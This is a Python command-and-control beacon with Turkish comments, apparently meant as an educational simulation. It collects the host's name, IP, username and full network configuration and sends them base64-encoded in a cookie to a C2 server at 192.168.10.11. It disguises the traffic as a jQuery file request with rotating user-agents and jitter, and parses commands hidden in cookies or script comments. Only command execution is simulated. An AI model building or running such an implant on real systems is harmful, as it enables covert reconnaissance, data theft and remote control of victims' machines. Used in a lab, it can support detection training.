#!/usr/bin/python3
import requests
import time
import random
import logging
import datetime
import base64
import json
import os
import socket
import platform
import uuid
import subprocess
from urllib3.exceptions import InsecureRequestWarning

# SSL uyarılarını devre dışı bırak
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Hedef C2 sunucusu (kendi makinemiz)
TARGET_HOST = "192.168.10.11"  
TARGET_PORT = 80
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}/wp-includes/js/jquery/jquery.min.js"  # Gizlenmek için meşru görünen bir path

# Beacon parametreleri
BASE_INTERVAL = 60  # 60 saniye
JITTER = 5  # ±5 saniye rastgelelik

# Log dosyası - gerçek malware'lerin çalışırken log üretmemesi daha uygundur
# ancak eğitim amaçlı kullanıyoruz
LOG_FILE = "beacon_operations.log"

# Loglama ayarları
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)

# Saldırı konsolunda gözükecek Beacon ID'si
BEACON_ID = str(uuid.uuid4()).split('-')[0]

# Sistem bilgilerini toplama
def collect_system_info():
    try:
        info = {
            "hostname": socket.gethostname(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "os": platform.system(),
            "platform": platform.platform(),
            "cpu": platform.processor(),
            "username": os.getlogin(),
            "pid": os.getpid(),
            "beacon_id": BEACON_ID
        }
        
        # Ağ konfigürasyonu (Linux/Mac için)
        if platform.system() != "Windows":
            try:
                ifconfig = subprocess.check_output(["ifconfig"], universal_newlines=True)
                info["network_config"] = ifconfig
            except:
                info["network_config"] = "Not available"
        else:
            # Windows için
            try:
                ipconfig = subprocess.check_output(["ipconfig", "/all"], universal_newlines=True)
                info["network_config"] = ipconfig
            except:
                info["network_config"] = "Not available"
                
        return info
    except Exception as e:
        logging.error(f"Sistem bilgisi toplanırken hata: {str(e)}")
        return {"error": "Failed to collect system info", "beacon_id": BEACON_ID}

# Sahte komut sonuçları oluşturma (simulasyon)
def generate_fake_command_output(command):
    outputs = {
        "whoami": os.getlogin(),
        "pwd": os.getcwd(),
        "dir": "\n".join(os.listdir()),
        "ls": "\n".join(os.listdir()),
        "ps": "PID TTY          TIME CMD\n 1234 pts/0    00:00:01 bash\n 5678 pts/0    00:00:00 python",
        "netstat": "Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address Foreign Address State\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN",
        "ifconfig": "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.5  netmask 255.255.255.0  broadcast 192.168.1.255",
        "ipconfig": "Windows IP Configuration\n\nEthernet adapter Ethernet:\n   Connection-specific DNS Suffix  . : localdomain\n   IPv4 Address. . . . . . . . . . . : 192.168.1.5\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 192.168.1.1"
    }
    
    # Komut için önceden tanımlanmış çıktı var mı?
    if command in outputs:
        return outputs[command]
    else:
        return f"Command '{command}' executed successfully."

# Base64 enkode/dekode fonksiyonları
def encode_data(data):
    json_data = json.dumps(data)
    return base64.b64encode(json_data.encode()).decode()

def decode_data(encoded_data):
    try:
        decoded = base64.b64decode(encoded_data).decode()
        return json.loads(decoded)
    except:
        return None

# Ana beacon döngüsü
def run_beacon():
    logging.info(f"[*] Beacon başlatıldı - Hedef: {TARGET_URL}")
    logging.info(f"[*] Beacon ID: {BEACON_ID}")
    logging.info(f"[*] İletişim aralığı: {BASE_INTERVAL}±{JITTER} saniye")
    
    session = requests.Session()
    
    # Gerçekçi user-agent'lar - Rastgele seçilecek
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55'
    ]
    
    # Beacon kurulumunda ilk sistem bilgilerini topla
    system_info = collect_system_info()
    
    # Beacon iletişim sayacı ve durum verileri
    beacon_count = 0
    last_beacon_time = None
    last_command = None
    command_output = None
    
    while True:
        try:
            current_time = datetime.datetime.now()
            beacon_count += 1
            
            # Beacon ile gönderilecek veriyi hazırla
            payload = {
                "beacon_id": BEACON_ID,
                "count": beacon_count,
                "timestamp": current_time.strftime("%Y-%m-%d %H:%M:%S"),
                "info": system_info if beacon_count == 1 else None,  # İlk iletişimde sistem bilgisi gönder
                "last_command": last_command,
                "command_output": command_output
            }
            
            # Veriyi gizle (Base64 encode)
            encoded_payload = encode_data(payload)
            
            # HTTP isteği için header'ları hazırla - normal trafik gibi görünmesi için
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cookie': f'session_id={encoded_payload}',  # Veriyi cookie içinde gizle
                'Cache-Control': 'max-age=0'
            }
            
            # C2 sunucusuna bağlan
            response = session.get(
                TARGET_URL,
                headers=headers,
                timeout=10,
                verify=False  # SSL doğrulamasını atla
            )
            
            # Zaman bilgisi
            if last_beacon_time:
                elapsed = (current_time - last_beacon_time).total_seconds()
                logging.info(f"[+] Beacon #{beacon_count} gönderildi: status {response.status_code}, son istekten {elapsed:.2f} saniye sonra")
            else:
                logging.info(f"[+] Beacon #{beacon_count} gönderildi: status {response.status_code}")
            
            # C2 sunucusundan komut var mı kontrol et
            try:
                # Komutlar Set-Cookie header'ında olabilir
                if 'Set-Cookie' in response.headers:
                    cookie_data = response.headers['Set-Cookie']
                    if 'cmd=' in cookie_data:
                        encoded_cmd = cookie_data.split('cmd=')[1].split(';')[0]
                        command_data = decode_data(encoded_cmd)
                        
                        if command_data and 'command' in command_data:
                            command = command_data['command']
                            logging.info(f"[*] C2'den yeni komut alındı: {command}")
                            
                            # Komutu simüle et
                            command_output = generate_fake_command_output(command)
                            last_command = command
                            logging.info(f"[*] Komut yürütüldü: {command}")
                        else:
                            command_output = None
                    else:
                        command_output = None
                # Alternatif olarak, response body'de de gizli komut olabilir
                elif response.content and len(response.content) > 0:
                    try:
                        response_text = response.text
                        if '/* COMMAND:' in response_text and '*/' in response_text:
                            encoded_cmd = response_text.split('/* COMMAND:')[1].split('*/')[0].strip()
                            command_data = decode_data(encoded_cmd)
                            
                            if command_data and 'command' in command_data:
                                command = command_data['command']
                                logging.info(f"[*] C2'den yeni komut alındı: {command}")
                                
                                # Komutu simüle et
                                command_output = generate_fake_command_output(command)
                                last_command = command
                                logging.info(f"[*] Komut yürütüldü: {command}")
                            else:
                                command_output = None
                        else:
                            command_output = None
                    except:
                        command_output = None
            except Exception as e:
                logging.error(f"[!] Komut işlenirken hata: {str(e)}")
                command_output = None
            
            last_beacon_time = current_time
            
        except requests.exceptions.ConnectionError:
            # Bağlantı hatası - sunucu kapalı olsa bile ağ trafiği oluşur
            current_time = datetime.datetime.now()
            
            if last_beacon_time:
                elapsed = (current_time - last_beacon_time).total_seconds()
                logging.info(f"[!] Beacon #{beacon_count} başarısız: Bağlantı hatası, son istekten {elapsed:.2f} saniye sonra")
            else:
                logging.info(f"[!] Beacon #{beacon_count} başarısız: Bağlantı hatası")
            
            last_beacon_time = current_time
            
        except Exception as e:
            logging.error(f"[!] Hata: {str(e)}")
        
        # Jitter ile bekle - gerçekçi C2 davranışı için
        sleep_time = BASE_INTERVAL + random.uniform(-JITTER, JITTER)
        sleep_time = max(1, sleep_time)  # Minimum 1 saniye
        
        next_time = datetime.datetime.now() + datetime.timedelta(seconds=sleep_time)
        logging.info(f"[*] Bir sonraki beacon zamanı: {next_time.strftime('%H:%M:%S')} ({sleep_time:.1f} saniye sonra)")
        time.sleep(sleep_time)

if __name__ == "__main__":
    run_beacon()
